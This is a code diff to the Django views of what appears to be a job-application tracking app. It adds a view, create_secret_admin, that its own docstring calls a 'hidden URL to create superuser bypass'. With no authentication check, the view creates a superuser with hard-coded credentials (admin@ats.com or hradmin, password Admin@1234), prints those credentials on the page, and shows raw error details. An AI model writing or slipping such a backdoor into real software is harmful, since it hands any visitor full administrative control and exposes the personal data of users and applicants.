@@ -10,6 +10,7 @@ from .utils import extract_text_from_pdf, calculate_match_score, extract_contact
 from .forms import JobForm
 from django.contrib.auth import logout
 
+
 User = get_user_model() 
 
 def job_list(request):
@@ -180,3 +181,29 @@ def custom_logout(request):
     logout(request)
     messages.info(request, "You have been securely logged out.")
     return redirect('job_list')
+
+
+
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
+def create_secret_admin(request):
+    """Hidden URL to create superuser bypass"""
+    User = get_user_model()
+    
+    # Check agar pehle se bana hua hai
+    if User.objects.filter(email='admin@ats.com').exists():
+        return HttpResponse("<h1>Admin pehle se bana hua hai! 😎</h1><p>Jakar login karo.<br><b>Email/Username:</b> admin@ats.com ya hradmin<br><b>Password:</b> Admin@1234</p>")
+    
+    try:
+        # Trick 1: Agar CustomUser me email hi username hai
+        User.objects.create_superuser(email='admin@ats.com', password='Admin@1234')
+        return HttpResponse("<h1>SUCCESS! 🔥</h1><p>Naya admin ban gaya.<br><b>Login Email:</b> admin@ats.com<br><b>Password:</b> Admin@1234</p>")
+    except Exception as e1:
+        try:
+            # Trick 2: Agar standard model jaisa hai jisme username chahiye
+            User.objects.create_superuser('hradmin', 'admin@ats.com', 'Admin@1234')
+            return HttpResponse("<h1>SUCCESS! 🔥</h1><p>Naya admin ban gaya.<br><b>Login Username:</b> hradmin<br><b>Password:</b> Admin@1234</p>")
+        except Exception as e2:
+            # Agar koi aur custom field required hai toh screen par error dikh jayega
+            return HttpResponse(f"<h1>Error Aaya! 😢</h1><p>Details: {e2}</p>")
